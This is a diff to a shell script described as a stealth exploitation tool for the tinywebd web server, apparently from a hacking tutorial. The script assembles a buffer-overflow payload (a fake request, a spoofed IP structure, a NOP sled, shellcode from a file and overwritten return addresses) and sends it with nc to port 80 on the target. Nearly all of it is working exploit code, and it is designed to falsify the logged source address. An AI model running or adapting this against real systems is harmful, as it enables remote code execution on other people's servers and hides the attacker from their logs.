@@ -1,5 +1,6 @@
 #!/bin/sh
-# IP spoofing stealth exploitation tool for tinywebd
+# silent stealth exploitation tool for tinywebd
+#    also spoofs IP address stored in memory
 
 SPOOFIP="12.34.56.78"
 SPOOFPORT="9090"
@@ -11,7 +12,7 @@ fi
 FAKEREQUEST="GET / HTTP/1.1\x00"
 FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
 OFFSET=540
-RETADD="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff5c0
+RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff5c0
 FAKEADDR="\xcf\xf5\xff\xbf" # +15 bytes from buffer @ 0xbffff5c0
 echo "target IP: $2"
 SIZE=`wc -c $1 | cut -f1 -d ' '`
@@ -24,4 +25,4 @@ echo "[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode 
  ./addr_struct "$SPOOFIP" "$SPOOFPORT";
  perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
  cat $1;
-perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\r\n\"") | nc -w 1 -v $2 80
+perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\x01\x00\x00\x00\r\n\"") | nc -w 1 -v $2 80
